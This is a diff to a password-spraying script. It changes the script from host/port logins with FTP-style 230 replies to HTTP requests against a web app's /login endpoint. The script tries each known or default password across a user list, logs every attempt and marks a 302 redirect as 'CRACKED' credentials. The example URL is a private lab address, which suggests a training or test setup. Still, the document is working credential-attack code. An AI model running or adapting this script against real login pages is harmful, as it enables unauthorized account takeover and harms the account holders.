@@ -1,4 +1,5 @@
-"""Known-password attack: a few known/default passwords sprayed across many accounts."""
+"""Known-password attack: a few known/default passwords sprayed across
+many accounts on the webapp's /login endpoint."""
 import argparse
 import os
 import time
@@ -8,8 +9,7 @@ from attacker_dict import try_login
 
 def main():
     parser = argparse.ArgumentParser()
-    parser.add_argument("--host", required=True)
-    parser.add_argument("--port", type=int, required=True)
+    parser.add_argument("--url", required=True, help="e.g. http://192.168.56.20:5000")
     parser.add_argument("--userlist", required=True)
     parser.add_argument("--passwords", required=True)
     parser.add_argument("--log", default=os.path.join(os.path.dirname(__file__), "logs", "attacker_spray.log"))
@@ -31,14 +31,14 @@ def main():
     for password in passwords:
         for username in users:
             try:
-                reply = try_login(args.host, args.port, username, password)
-            except OSError as e:
-                reply = f"ERROR {e}"
+                status = try_login(args.url, username, password)
+            except Exception as e:
+                status = f"ERROR {e}"
             elapsed = time.time() - start
-            line = f"[{elapsed:7.3f}s] user={username} password={password!r} -> {reply}"
+            line = f"[{elapsed:7.3f}s] user={username} password={password!r} -> HTTP {status}"
             print(line)
             logf.write(line + "\n")
-            if reply.startswith("230"):
+            if status == 302:
                 hits.append((username, password))
                 logf.write(f"CRACKED user={username} password={password}\n")
 
